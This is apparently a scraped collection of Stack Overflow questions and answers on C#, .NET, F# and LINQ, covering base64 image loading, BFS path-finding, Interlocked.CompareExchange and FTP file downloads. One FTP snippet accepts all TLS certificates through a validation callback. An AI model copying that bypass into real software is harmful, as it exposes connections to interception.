<p>...And this is what loads (well, trys to anyway) the image from the xml file and displays it on the Form:</p>

<pre><code>public Image Base64ToImage(string base64String)
{
    // Convert Base64 String to byte[]
    byte[] imageBytes = Convert.FromBase64String(base64String);
    MemoryStream ms = new MemoryStream(imageBytes);
    return Image.FromStream(ms, true);
}
</code></pre>

<p>And here is what the xml file looks like:</p>

<pre><code>&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;
&lt;cs&gt;
  &lt;PictureBox Content=""Qk1mAgAAAAAAALYAAAAoAAAAFgAAABIAAAABAAgAAAAAAAAAAADEDgAAxA4AACAAAAAgAAAA/////8z///8z////AMD////MzP9mzMz/M8zM/zOZzP/AwMD/vLy8/2aZmf8zmZn/M2aZ/5CQkP9sbGz/ZmZm/zMzZv9BQUH/AAAA/8DAwAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8TEw0PDw8PDRMTExMTExMTExMTExMTAAATDw8JCQkJEQ0TExAQEBAQEBMTExMTAAAODQAPCQEJCRENEAUFBQUFBRAQExMTAAAOAQ8NDwkBAAkRAwMCAgICBQULEBMTAAANDw0ADw0NAAkRAwICAgICAgUFCxATAAATDwEPDw8JAAkRAwICAgUFBQIFBRATAAATDQ8PCQEAEREDAwICAgICAgICBQsQAAATExMPDw8PEQMDAgcHBwsLCwwMBQsQAAATEw8BAA8BABEDAgcCAgICAgIFDAsQAAATEw8BDxMPAREDAwIFBQUFBQUFBQsQAAATDwEADxMPAQARAwICAgIKCgYEBAsQAAATDwEPExMQDwERAwIGBAQCBgASAAsQAAATDQ8NExMTDRENAgIGEgACAgYAABATAAATExMTExMTEAMDAgIAAAACAgYKChATAAATExMTExMTExADAwIKBgYCAgIGEBMTAAATExMTExMTExMQEAMCCgoCAhAQExMTAAATExMTExMTExMTExAQEBAQEBMTExMTAAATExMTExMTExMTExMTExMTExMTExMTAAA="" LocationX=""446"" LocationY=""125"" /&gt;
&lt;/cs&gt;
</code></pre>

<hr />

<h1>UPDATE</h1>

<p>Here is the code that I use to open/read/process the xml file. Also note that all other controls (such as labels linklabels etc) are properly read from the file and successfully displayed on the Form. It's just the PictureBox's that don't show up:</p>

<pre><code>private void toolStripButton1392_Click(object sender, EventArgs e)
{
    OpenFileDialog o = new OpenFileDialog();

    o.Filter =
        ""T Multimedia Format (*.mf)|*.mf|"" +
        ""Word Document (*.docx)|*.docx|"" +
        ""PDF Document (*.pdf)|*.pdf|"" +
        ""Text FIle (*.txt)|*.txt"";
    o.Title = ""T 11 - Open Document"";

    using (o)
    {
        if (o.ShowDialog() == DialogResult.OK)
        {
            foreach (var controlTag in XDocument.Load(o.FileName).Root.Elements())
            {
                var controlType = Type.GetType(string.Format(""System.Windows.Forms.{0}, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"", controlTag.Name.LocalName), false);
                if (controlType == null || !typeof(Control).IsAssignableFrom(controlType))
                {
                    continue;
                }

                var control = (Control)Activator.CreateInstance(controlType);
                control.Text = controlTag.Attributes(""Content"").First().Value;

                try
                {
                    control.ForeColor = Color.FromArgb(
                        int.Parse(controlTag.Attributes(""A"").First().Value),
                        int.Parse(controlTag.Attributes(""R"").First().Value),
                        int.Parse(controlTag.Attributes(""G"").First().Value),
                        int.Parse(controlTag.Attributes(""B"").First().Value));

                    Font font = FromString(controlTag.Attributes(""Font"").First().Value);
                    control.Font = font;
                }
                catch { continue; }

                control.BackColor = Color.Transparent;

                control.MouseDown += new MouseEventHandler(control_MouseDown);
                control.MouseMove += new MouseEventHandler(control_MouseMove);
                control.MouseUp += new MouseEventHandler(control_MouseUp);
                control.MouseClick += new MouseEventHandler(control_MouseClick);
                control.MouseDoubleClick += new MouseEventHandler(control_MouseDoubleClick);

                Type t = control.GetType();
                if (t.Name == ""Label"")
                {
                    Control c = control;
                    c = control;
                    Label label = (Label)control;
                    label.AutoSize = true;
                    label.Location = new Point(
                        Convert.ToInt32(controlTag.Attributes(""LocationX"").First().Value),
                        Convert.ToInt32(controlTag.Attributes(""LocationY"").First().Value));

                    Canvas.Controls.Add(label);

                    // handlers.
                    label.MouseDown += new MouseEventHandler(label_MouseDown);
                    label.MouseMove += new MouseEventHandler(label_MouseMove);
                    label.MouseUp += new MouseEventHandler(label_MouseUp);
                    label.MouseClick += new MouseEventHandler(label_MouseClick);
                    label.MouseDoubleClick += new MouseEventHandler(label_MouseDoubleClick);
                }
                else if (t.Name == ""LinkLabel"")
                {
                    Control c = control;

                    LinkLabel link = new LinkLabel();
                    link.AutoSize = true;
                    link.Location = new Point(
                        Convert.ToInt32(controlTag.Attributes(""LocationX"").First().Value),
                        Convert.ToInt32(controlTag.Attributes(""LocationY"").First().Value));

                    Canvas.Controls.Add(link);

                    // Add handlers.
                    link.MouseDown += new MouseEventHandler(link_MouseDown);
                    link.MouseMove += new MouseEventHandler(link_MouseMove);
                    link.MouseUp += new MouseEventHandler(link_MouseUp);
                    link.MouseClick += new MouseEventHandler(link_MouseClick);
                    link.MouseDoubleClick += new MouseEventHandler(link_MouseDoubleClick);
                }
                else if (t.Name == ""PictureBox"")
                {
                    Control c = control;
                    c = control;
                    PictureBox p = new PictureBox();

                    p.Image = Base64ToImage(controlTag.Attributes(""Content"").First().Value);
                    p.InitialImage = Base64ToImage(controlTag.Attributes(""Content"").First().Value);
                    p.Size = new Size(50, 50);
                    p.Location = new Point(
                        Convert.ToInt32(controlTag.Attributes(""LocationX"").First().Value),
                        Convert.ToInt32(controlTag.Attributes(""LocationY"").First().Value));

                    Canvas.Controls.Add(p);

                    // Add handlers.
                    p.MouseDown += new MouseEventHandler(p_MouseDown);
                    p.MouseMove += new MouseEventHandler(p_MouseMove);
                    p.MouseUp += new MouseEventHandler(p_MouseUp);
                    p.MouseClick += new MouseEventHandler(p_MouseClick);
                    p.MouseDoubleClick += new MouseEventHandler(p_MouseDoubleClick);
                }
            }
            this.Text = ""T 11 - "" + o.FileName;
        }
    }
}
</code></pre>
","33708","","<p>You should reset the position of <code>MemoryStream</code> right after the <code>Write</code> call:</p>

<pre><code>ms.Position = 0;
</code></pre>

<p>Calls to <code>Write</code> will increase the position automatically. Consequently, without resetting the position, the stream will already be at the end and <code>Image.FromStream</code> will fail to read from it (it starts reading at the current position).</p>

<hr>

<h3>Update</h3>

<p>I'm seeing that your <code>Write</code> call is fundamentally unnecessary. You should simply initialize the <code>MemoryStream</code> with the <code>byte[]</code> directly by passing it as the constructor:</p>

<pre><code>byte[] imageBytes = Convert.FromBase64String(base64String);
MemoryStream ms = new MemoryStream(imageBytes);
return Image.FromStream(ms, true);
</code></pre>

<p>If this fails, something is probably wrong with the data you're reading from XML.</p>

<hr>

<h3>Update:</h3>

<p>My test application works with your image:</p>

<pre><code>using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using System.Xml.Linq;
class Program
{
    static void Main(string[] args)
    {
        string xml = @""&lt;?xml version=""""1.0"""" encoding=""""utf-8""""?&gt;
&lt;cs&gt;
  &lt;PictureBox Content=""""Qk1mAgAAAAAAALYAAAAoAAAAFgAAABIAAAABAAgAAAAAAAAAAADEDgAAxA4AACAAAAAgAAAA/////8z///8z////AMD////MzP9mzMz/M8zM/zOZzP/AwMD/vLy8/2aZmf8zmZn/M2aZ/5CQkP9sbGz/ZmZm/zMzZv9BQUH/AAAA/8DAwAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8TEw0PDw8PDRMTExMTExMTExMTExMTAAATDw8JCQkJEQ0TExAQEBAQEBMTExMTAAAODQAPCQEJCRENEAUFBQUFBRAQExMTAAAOAQ8NDwkBAAkRAwMCAgICBQULEBMTAAANDw0ADw0NAAkRAwICAgICAgUFCxATAAATDwEPDw8JAAkRAwICAgUFBQIFBRATAAATDQ8PCQEAEREDAwICAgICAgICBQsQAAATExMPDw8PEQMDAgcHBwsLCwwMBQsQAAATEw8BAA8BABEDAgcCAgICAgIFDAsQAAATEw8BDxMPAREDAwIFBQUFBQUFBQsQAAATDwEADxMPAQARAwICAgIKCgYEBAsQAAATDwEPExMQDwERAwIGBAQCBgASAAsQAAATDQ8NExMTDRENAgIGEgACAgYAABATAAATExMTExMTEAMDAgIAAAACAgYKChATAAATExMTExMTExADAwIKBgYCAgIGEBMTAAATExMTExMTExMQEAMCCgoCAhAQExMTAAATExMTExMTExMTExAQEBAQEBMTExMTAAATExMTExMTExMTExMTExMTExMTExMTAAA="""" LocationX=""""446"""" LocationY=""""125"""" /&gt;
&lt;/cs&gt;"";
        var x = XDocument.Parse(xml);
        var s = x.Descendants(""PictureBox"").First().Attribute(""Content"").Value;
        var f = new Form();
        PictureBox p = new PictureBox();
        p.Dock = DockStyle.Fill;
        f.Controls.Add(p);
        p.Image = Base64ToImage(s);
        Application.Run(f);
    }

    static Image Base64ToImage(string base64String)
    {
        byte[] imageBytes = Convert.FromBase64String(base64String);
        MemoryStream ms = new MemoryStream(imageBytes);
        return Image.FromStream(ms, true);
    }
}
</code></pre>

<p>Check your event handlers, XML load process, and other stuff. This part of code looks fine.</p>
"
"<p>I'm reading 'Functional Programming' by Tomas Petricek &amp; Jon Skeet and I understand the difference between declarative &amp; imperative programming.</p>

<p>What I was wondering is how are the primitive operators &amp; functions implemented, are declarative languages constructed from imperative operators &amp; functions.</p>

<p>Cheers</p>

<p>AWC </p>
","33708","","<p>Your question is a bit unclear. Under the hood, processor instructions are imperative in nature. If your code is supposed to run on a von Neumann machine, it should be eventually run as imperative code.</p>

<p>It may be possible to build a machine (with some specific architecture) that inherently supports those operations. In fact <a href=""http://en.wikipedia.org/wiki/LispM"" rel=""nofollow"">LispM</a> had been designed to help run Lisp programs. While I'm not familiar with the hardware characteristics of LispM, it probably does qualify as providing some primitive operations at a more declarative level.</p>
"
"<p>lets say that I've got this XML:</p>

<pre><code>&lt;items&gt; 
  &lt;item name=""thumb""&gt; 
    &lt;downloadStream&gt;test1&lt;/downloadStream&gt; 
    &lt;downloadStream&gt;test2&lt;/downloadStream&gt; 
    &lt;downloadStream&gt;test3&lt;/downloadStream&gt; 
  &lt;/item&gt; 
  &lt;item name=""photo""&gt; 
    &lt;downloadStream&gt;test5&lt;/downloadStream&gt; 
    &lt;downloadStream&gt;test6&lt;/downloadStream&gt; 
    &lt;downloadStream&gt;test7&lt;/downloadStream&gt; 
  &lt;/item&gt; 
&lt;/items&gt; 
</code></pre>

<p>I'm trying to write a LINQ statement which will convert this to the following strings:</p>

<pre><code>{ ""thumb test1"",
  ""thumb test2"",
  ""thumb test3"",
  ""photo test5"",
  ""photo test6"",
  ""photo test7"", }
</code></pre>

<p>In other words, it appends the attribute from the parent node to the inner-string of each child node.  </p>

<p>Is their a way that I can use one LINQ query to do something like this?  I can find a few ways to break it up into multiple steps, but I have a feeling that their is an easier way. </p>

<p>Thanks!</p>
","33708","","<pre><code>var list = x.Descendants(""item"")
            .SelectMany(item =&gt; item.Elements(""downloadStream"")
                                    .Select(e =&gt; (string)item.Attribute(""name"") 
                                                 + "" "" 
                                                 + (string)e)).ToList();
</code></pre>
"
"<p>I'm taking a course on Microprocessor Programming as part of my Electronic Engineering degree. Unfortunately, in the labs, we have to work in DOS using MASM.</p>

<p>Now, I don't really find DOS a hindrance, but I just don't have it on a computer at home (and none of the computers that I have have floppy drives), so I am unable to practice writing programs. I have tried under Windows, but it just doesn't assemble (I am guessing this is because of Protected Mode).</p>

<p>Any advice on what should I do? Should I just learn to program in Protected Mode? Will that help me with the course? The course is focused on the 8086.</p>

<p>Perhaps a virtual machine could help? If so, where can I get DOS and MASM for it?</p>
","33708","","<p>A virtual machine would do. I'm pretty sure DOS is freely available on MSDNAA if your academic institution provides access to it. If you're using Windows, I suggest using the Microsoft Virtual PC for DOS VMs. While I personally prefer VMware as a VM host, for DOS specifically, Virtual PC seems to be doing a better job at emulation.</p>
"
"<p>Seems to me that File.Exists() is much slower when the file does not exist or the use doesn't have access than when the file does exist? This doesn't make sense to me.</p>
","33708","","<p>Generally when you search a bunch of stuff for something, you can't be sure about their lack of existence unless you have searched <em>all possible places</em> it could have been. When searching for something (in most kinds of collections) the worst case is when the item doesn't exist in the collection.</p>

<p>I have not benchmarked <code>File.Exists</code> in particular but I highly doubt that there's a really noticeable difference in those cases unless you're doing it thousands of times. How did you reach to this conclusion?</p>
"
"<p>Target OS: Win2003 </p>

<p>As posted in other SO questions about file operation atomicity, Win32 was simply not designed for transactions. Still I wonder whether file deletion could be non-atomic. After all, it is either get deleted or not. Or can a file remain in any other intermediate state on NTFS file system caused by a system crash or something else during deletion?</p>
","33708","","<p>NTFS is a <a href=""http://en.wikipedia.org/wiki/Journaling_file_system"">journaled file system</a>. A journal is basically equivalent to a transaction log in a database. It'll ensure consistency and integrity of the file system structures like a database does for its tables. While <code>File.Delete</code> doesn't have any transactional code at the high level, NTFS does maintain transactional integrity at the filesystem level. This may not be true for other file system drivers.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/2024305/c-sharp-foreach-vs-functional-each"">C# foreach vs functional each</a>  </p>
</blockquote>



<p>This is a question about coding for readability.</p>

<p>I have an <code>XDocument</code> and a <code>List&lt;string&gt;</code> of the names of the elements that contain sensitive information that I need to mask (replace with underscores in this example).</p>

<pre><code>XDocument xDoc;
List&lt;string&gt; propertiesToMask;
</code></pre>

<p>This can be written in two ways, using traditional <code>foreach</code> loops, or using <code>.ForEach</code> methods with lamba syntax.</p>

<pre><code>foreach (string propertyToMask in propertiesToMask)
{
    foreach (XElement element in xDoc.Descendants(propertyToMask))
    {
        element.SetValue(new string('_', element.Value.Length));
    }
}
</code></pre>

<p>or</p>

<pre><code>propertiesToMask
    .ForEach(propertyToMask =&gt; xDoc.Descendants(propertyToMask).ToList()
        .ForEach(element =&gt; element.SetValue(new string('_', element.Value.Length))));
</code></pre>

<p>Which approach do you think is the most readable, and why? If you prefer the second example, how would you present it for maximum readability?</p>
","33708","","<p><a href=""http://stackoverflow.com/users/88656/eric-lippert"">Eric Lippert</a> has a <a href=""http://blogs.msdn.com/ericlippert/archive/2009/05/18/foreach-vs-foreach.aspx"">good entry about this on his blog</a>. To summarize, the very task done by <code>ForEach</code> is to produce side effects which may not be a desirable thing to do with the functional style of programming in C#.</p>
"
"<p>I'd like to use <a href=""http://code.google.com/p/markdownsharp/"" rel=""nofollow"">Markdown#</a> in a project I'm working on (Not a .Net project, but I have the ability to instantiate .Net class libraries and use them natively). Unfortunately I haven't been able to find a pre-compiled Markdown# DLL.</p>

<p>I'd really rather not install Visual Studio just for the purpose of compiling the project.</p>

<p>Are there DLL download links somewhere that I'm just missing?</p>
","33708","","<p>You don't need Visual Studio. Just run <code>msbuild</code> which comes with the .NET Framework on the solution file.</p>

<p>Open up a command prompt, switch to the MarkdownSharp directory, and run <code>msbuild</code>:</p>

<pre><code>""C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe""
</code></pre>
"
"<p>I have a MVC that posts an array of int, and I want to convert that array of int's to IEnumerable&lt;MyTestObj&gt;, how is that done? I cant use <code>myintArr.AsEnumerable()</code> it seems.</p>
","33708","","<p>You need something along the lines of the following (depending how you create the object):</p>

<pre><code>myIntArr.Select(i =&gt; new MyTestObj(i));
// or...
myIntArr.Select(i =&gt; (MyTestObj)i);
// or...
myIntArr.Select(i =&gt; new MyTestObj { SomeProperty = i });
</code></pre>
"
"<p>I am trying to take a numeric array in F#, and rank all the elements so that ties get the same rank.  Basically I'm trying to replicate the algorithm I have below in C#, but just for an array of doubles.  Help?          </p>

<p>rankMatchNum = 0;
            rankMatchSum = 0;
            previousScore = -999999999;</p>

<pre><code>        for (int i = 0; i &lt; factorStocks.Count; i++)
        {
            //The 1st time through it won't ever match the previous score...
            if (factorStocks[i].factors[factorName + ""_R""] == previousScore)
            {
                rankMatchNum = rankMatchNum + 1;     //The count of matching ranks
                rankMatchSum = rankMatchSum + i + 1; //The rank itself...
                for (int j = 0; j &lt;= rankMatchNum; j++)
                {
                    factorStocks[i - j].factors[factorName + ""_WR""] = rankMatchSum / (rankMatchNum + 1);
                }
            }
            else
            {
                rankMatchNum = 0;
                rankMatchSum = i + 1;
                previousScore = factorStocks[i].factors[factorName + ""_R""];
                factorStocks[i].factors[factorName + ""_WR""] = i + 1;
            }
        }
</code></pre>
","33708","","<p>This is not a very efficient algorithm (O(n<sup>2</sup>)), but it's quite short and readable:</p>

<pre><code>let percentile arr =
   let rank item = ((arr |&gt; Seq.filter (fun i -&gt; i &lt; item) 
                         |&gt; Seq.length |&gt; float) + 1.0) 
                   / float (Array.length arr) * 100.0
   Array.map rank arr
</code></pre>

<p>You might mess with the expression <code>fun i -&gt; i &lt; e</code> (or the + 1.0 expression) to achieve your desired way of ranking results:</p>

<pre><code>let arr = [|1.0;2.0;2.0;4.0;3.0;3.0|]
percentile arr |&gt; print_any;;

[|16.66666667; 33.33333333; 33.33333333; 100.0; 66.66666667; 66.66666667|]
</code></pre>
"
"<p>I need an algorithm to hash a string of arbitrary length into a value from 1 through 26.</p>

<p>I realize that I could sum the values of the individual characters and do a mod 26 + 1, but thought maybe someone would have a more performant way of doing this.</p>
","33708","","<p>Do you need to make hash values not to change across different runs of an app? If you don't, and you want to use it in memory, simply use the system provided <code>GetHashCode</code> function:</p>

<pre><code>(s.GetHashCode() % 26) +  1
</code></pre>

<p>will map a string to an integer between 1 and 26 inclusive. Of course, this is not really suitable for tasks like persisting in a database.</p>
"
"<p>I am trying to come up with an algorithm for a tree traversal, but I am getting stuck.</p>

<p>This is a fairly hard question (compared to others I have asked) so I may need to keep figuring on my own.  But I thought I would throw it out here.</p>

<p>I have the following class structure:</p>

<pre><code>public class Transition
{
    // The state we are moving from.
    public String From { get; set; }
    // All the To states for this from
    public List&lt;String&gt;To { get; set; }
}

List&lt;Transition&gt; currentTransistions;
</code></pre>

<p>When currentTransistions is fully filled out it looks like this (for me):</p>

<pre><code>&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;
&lt;ArrayOfTransition xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema""&gt;
  &lt;Transition&gt;
    &lt;From /&gt;
    &lt;To&gt;
      &lt;string&gt;Not Done&lt;/string&gt;
    &lt;/To&gt;
  &lt;/Transition&gt;
  &lt;Transition&gt;
    &lt;From&gt;Not Done&lt;/From&gt;
    &lt;To&gt;
      &lt;string&gt;In Progress&lt;/string&gt;
      &lt;string&gt;Deleted&lt;/string&gt;
    &lt;/To&gt;
  &lt;/Transition&gt;
  &lt;Transition&gt;
    &lt;From&gt;Deleted&lt;/From&gt;
    &lt;To&gt;
      &lt;string&gt;Not Done&lt;/string&gt;
    &lt;/To&gt;
  &lt;/Transition&gt;
  &lt;Transition&gt;
    &lt;From&gt;In Progress&lt;/From&gt;
    &lt;To&gt;
      &lt;string&gt;Done&lt;/string&gt;
      &lt;string&gt;Ready For Test&lt;/string&gt;
      &lt;string&gt;Deleted&lt;/string&gt;
    &lt;/To&gt;
  &lt;/Transition&gt;
  &lt;Transition&gt;
    &lt;From&gt;Done&lt;/From&gt;
    &lt;To&gt;
      &lt;string&gt;In Progress&lt;/string&gt;
    &lt;/To&gt;
  &lt;/Transition&gt;
  &lt;Transition&gt;
    &lt;From&gt;Ready For Test&lt;/From&gt;
    &lt;To&gt;
      &lt;string&gt;In Progress&lt;/string&gt;
      &lt;string&gt;Done&lt;/string&gt;
      &lt;string&gt;Deleted&lt;/string&gt;
    &lt;/To&gt;
  &lt;/Transition&gt;
&lt;/ArrayOfTransition&gt;
</code></pre>

<p>The idea here is that I have mapped the state transitions for TFS Work items.  What I need now is a way to say ""Given a current state, how do I get to another state"".</p>

<p>Ideally it would look like this:</p>

<pre><code> foreach (string state in GetToFinalState(finalState, currentState, currentTransistions)
 {
     // Save the workitem at the state so we can get to the final state.
 }
</code></pre>

<p>GetToFinalState, would have to have a way to caclulate the shortest path and use the yield feature of C# to offer them up one at a time for the foreach statement.</p>

<p>I have used yield one before, so I think I can figure that out.  But I am not sure how to do that at the same time as finding the shortest path (with out recalculating on each time in the func)? </p>

<p>If you have read this far, thanks.  If you offer an answer then double thanks.</p>
","33708","","<p>You can't do that efficiently without calculating the shortest path and <code>yield</code>ing each path segment after the whole process is completed.  The nature of shortest path problem doesn't lend itself to algorithms that efficiently compute such partial solutions.</p>

<p>Since the transition graph is not weighted, you can simply run a <a href=""http://en.wikipedia.org/wiki/Breadth-first_search"" rel=""nofollow"">BFS</a> on it to compute the shortest path. You need to do something like this (I'm not sure of the properties of the TFS object so this is just a pseudocode):</p>

<pre><code>IEnumerable&lt;string&gt; ShortestPath(string fromState, string toState, Transition[] currentTransitions) {
    var map = new Dictionary&lt;string, string&gt;();
    var edges = currentTransitions.ToDictionary(i =&gt; i.From, i =&gt; i.To);
    var q = new Queue&lt;string&gt;(); 
    map.Add(fromState, null);
    q.Enqueue(fromState);
    while (q.Count &gt; 0) {
        var current = q.Dequeue();
        foreach (var s in edges[current]) {
            if (!map.ContainsKey(s)) {
                map.Add(s, current);
                if (s == toState) {
                    var result = new Stack&lt;string&gt;();
                    var thisNode = s;
                    do {
                        result.Push(thisNode);
                        thisNode = map[thisNode];
                    } while (thisNode != fromState);
                    while (result.Count &gt; 0)
                        yield return result.Pop();
                    yield break;
                }
                q.Enqueue(s);
            }
        }
    }
    // no path exists
}
</code></pre>
"
"<p><em>Disclaimer: My posts are apparently always verbose. If you happen to know the answer to the title question, feel free to just answer it without reading my extended discussion below.</em></p>

<hr>

<p>The <code>System.Threading.Interlocked</code> class provides some very useful methods to assist in writing thread-safe code. One of the more complex methods is <code>CompareExchange</code>, which can be used for computing a running total that may be updated from multiple threads.</p>

<p>Since the use of <code>CompareExchange</code> is a bit tricky, I thought it a rather common-sense idea to provide some helper methods for it:</p>

<pre><code>// code mangled so as not to require horizontal scrolling
// (on my monitor, anyway)
public static double Aggregate
(ref double value, Func&lt;double, double&gt; aggregator) {
    double initial, aggregated;

    do {
        initial = value;
        aggregated = aggregator(initial);
    } while (
        initial != Interlocked.CompareExchange(ref value, aggregated, initial)
    );

    return aggregated;
}

public static double Increase(ref double value, double amount) {
    return Aggregate(ref value, delegate(double d) { return d + amount; });
}

public static double Decrease(ref double value, double amount) {
    return Aggregate(ref value, delegate(double d) { return d - amount; });
}
</code></pre>

<p>Now, perhaps I am just guilty of being generic-happy (I will admit, this is often true); but it does feel silly <strong>to me</strong> to restrict the functionality provided by the above methods to <code>double</code> values only (or, more accurately, for me to have to write overloaded versions of the above methods for every type I want to support). Why can't I do this?</p>

<pre><code>// the code mangling continues...
public static T Aggregate&lt;T&gt;
(ref T value, Func&lt;T, T&gt; aggregator) where T : IEquatable&lt;T&gt; {
    T initial, aggregated;

    do {
        initial = value;
        aggregated = aggregator(initial);
    } while (
        !initial.Equals(
            Interlocked.CompareExchange&lt;T&gt;(ref value, aggregated, initial)
        )
    );
}
</code></pre>

<p>I can't do this because <code>Interlocked.CompareExchange&lt;T&gt;</code> apparently has a <code>where T : class</code> constraint, and <strong>I don't understand why</strong>. I mean, <em>maybe</em> it's because there are already overloads for <code>CompareExchange</code> that accept <code>Int32</code>, <code>Int64</code>, <code>Double</code>, etc.; but that hardly seems a good rationale. In my case, for example, it would be quite handy to be able to use the <code>Aggregate&lt;T&gt;</code> method to perform a wide range of atomic calculations.</p>
","33708","","<p><code>Interlocked.CompareExchange</code> is meant to be implemented with native atomic instructions provided directly by the processor. It's pointless to have something like that use a <code>lock</code> internally (it's designed for lock-free scenarios). </p>

<p>Processors that provide atomic compare exchange instruction naturally support it as small, ""register-sized"" operations (e.g. the largest compare-exchange instruction on an Intel x64 processor is <code>cmpxchg16b</code> that works on 128 bit values). </p>

<p>An arbitrary value type can be potentially bigger than that and compare-exchanging it may not be possible with a single instruction. Compare-exchanging a reference type is easy. Regardless of its total size in memory, you'll be comparing and copying a small pointer of a known size. This is also true for primitive types like <code>Int32</code> and <code>Double</code>&mdash;all of them are small.</p>
"
"<pre><code>public static bool AllNodesChecked(TreeNodeCollection nodes)        
{
    foreach (TreeNode node in nodes)
    {
        if (!node.Checked)
        {
            return false;
        }
        AllNodesChecked(node.Nodes);
    }
    return true;
}
</code></pre>

<p>Test tree is </p>

<pre><code>A1(checked) -&gt; B1(unchecked)
A2(checked)
A3(checked)
</code></pre>

<p>but it isn't returning when it hits node B1.</p>

<p>EDIT: Thank you all for helping my tired brain. Recursion should only be attempted early in the day after a cold shower.</p>
","33708","","<p>You are ignoring the return value of <code>AllNodesChecked</code> in the recursive call:</p>

<pre><code>public static bool AllNodesChecked(TreeNodeCollection nodes)        
{
    foreach (TreeNode node in nodes)
        if (!node.Checked || !AllNodesChecked(node.Nodes))
           return false;
    return true;
}
</code></pre>

<p>The <code>return</code> statement only returns from the <em>current</em> method in the call stack to the immediate caller. It doesn't suddenly return from all other calls above in the call stack.</p>
"
"<p>I have a class with an overloaded method:</p>

<pre><code>MyClass.DoThis(Action&lt;Foo&gt; action);
MyClass.DoThis(Action&lt;Bar&gt; action);
</code></pre>

<p>I want to pass a lambda expression to the Action version:</p>

<pre><code>MyClass.DoThis( foo =&gt; foo.DoSomething() );
</code></pre>

<p>Unfortunately, Visual Studio rightly cannot tell the difference between the <code>Action&lt;Foo&gt;</code> and <code>Action&lt;Bar&gt;</code> versions, due to the type inference surrounding the ""foo"" variable -- and so it raises a compiler error:</p>

<blockquote>
  <p>The call is ambiguous between the following methods or properties: 'MyClass.DoThis(System.Action<code>&lt;Foo&gt;</code>)' and 'MyClass.DoThis(System.Action<code>&lt;Bar&gt;</code>)'</p>
</blockquote>

<p>What's the best way to get around this?</p>
","33708","","<p>There's no way the compiler could figure that out by itself. The call is indeed ambiguous and you'll have to somehow clarify the overload you want for the compiler. The parameter name ""foo"" is insignificant here in the overload resolution.</p>

<pre><code>MyClass.DoThis(new Action&lt;Foo&gt;(foo =&gt; foo.DoSomething()));
</code></pre>
"
"<p>I'm looking for a WebHelper class for C#, one that wraps and stuff all the common requests, such as like POSTing and GETting http requests etc.</p>
","33708","","<p>Aren't <code>System.Net.WebClient</code> and <code>System.Net.WebRequest</code> already doing this for you pretty elegantly?</p>
"
"<p>How to download .zip file format using c# code?</p>

<p>Here is the code, i am using to download. Just to highlight, If i download .txt file, it works fine. If i download .zip file, it downloads the .zip file but i can't open this. It complains that .zip is in incorrect format.  I have doubt in how i am writing back the file on local drive.</p>

<p>Help?</p>

<pre><code>string ftpServerIP = FTPServer;
string ftpUserID = FTPUser;
string ftpPassword = FTPPwd;
FileInfo fileInf = new FileInfo(FileName);
string uri = ""ftp://"" + ftpServerIP + ""/"" + fileInf.Name;
FtpWebRequest reqFTP = (FtpWebRequest)FtpWebRequest.Create(uri); //new Uri(""ftp://"" + ftpServerIP + DestinationFolder + fileInf.Name));
reqFTP.Credentials = new NetworkCredential(ftpUserID, ftpPassword);
reqFTP.EnableSsl = true;
reqFTP.KeepAlive = false;
reqFTP.UseBinary = true;
//reqFTP.UsePassive = true;
reqFTP.Method = WebRequestMethods.Ftp.DownloadFile;
ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(AcceptAllCertifications);
//Stream strm = reqFTP.GetRequestStream();
StreamReader reader = new StreamReader(reqFTP.GetResponse().GetResponseStream());
StreamWriter writer = new StreamWriter(Path.Combine(FolderToWriteFiles, FileName), false);
writer.Write(reader.ReadToEnd());
return true; 
</code></pre>
","33708","","<pre><code>using System.Net;
// ...

new WebClient().DownloadFile(""ftp://ftp.someurl.com/file.zip"",
                             ""C:\\downloadedFile.zip"");
</code></pre>

<hr>

<h3>Answer to the updated question:</h3>

<p>The way you are saving the stream to disk is wrong. You are treating the stream as a character sequence, which corrupts the ZIP file in the process. Open a <code>FileStream</code> instead of a <code>StreamWriter</code> and copy the <code>GetResponseStream()</code> return value directly to that <code>FileStream</code> using something like <a href=""http://stackoverflow.com/questions/444309/what-would-be-the-fastest-way-to-concatenate-three-files-in-c/444316#444316"">my <code>CopyStream</code> function from here</a>.</p>
"
"<p>I was reading through some of the responses in <a href=""http://stackoverflow.com/questions/172303/is-there-a-regular-expression-to-detect-a-valid-regular-expression"">this</a> question and saw that a few people said that recursive regular expressions were not strictly speaking regular expressions.</p>

<p>Why is this?</p>
","33708","","<p>All regular languages can be recognized by a <em>finite automaton</em>. A finite automaton has a finite number of states, and consequently, finite memory (hence the name). A recursive ""regular"" expression requires a potentially infinite stack space to do the recursion, thus it is not possible to recognize it with a finite automaton, therefore it is not regular.</p>
"
"<p>given a delegate like </p>

<pre><code>Func&lt;string,string,string&gt; MyFunc = (firstName,lastName) =&gt; string.Format(""Given Name:{0} Surname:{1}"",
                                                                            firstName,
                                                                            lastName);
</code></pre>

<p>How would you can you document the parameters of firstName and lastName, so they show up in intellisense (like method descriptions and parameters do)?<br>
Example:</p>

<pre><code>/// &lt;summary&gt;
/// My Method
/// &lt;/summary&gt;
/// &lt;param name=""firstName""&gt;The first name.&lt;/param&gt;
/// &lt;param name=""lastName""&gt;The last name.&lt;/param&gt;
/// &lt;returns&gt;&lt;/returns&gt; 
public string MyMethod(string firstName, string lastName)
{ 
  return string.Format(""Given Name:{0} Surname:{1}"",firstName,lastName);
}
</code></pre>

<p>I want to hover over the delegate or have intellisense popup when I type and tell me the descriptions for the the delegate parameters, like it would with the above method.</p>
","33708","","<p>A field of a delegate type is still a field and not a method&mdash;it doesn't take parameters in itself. The parameters belong to the delegate <em>type</em>, not the delegate <em>field</em>. You can write the comments for parameters when you delegate types if you want.</p>

<pre><code>/// &lt;summary&gt;
/// Tests something.
/// &lt;/summary&gt;
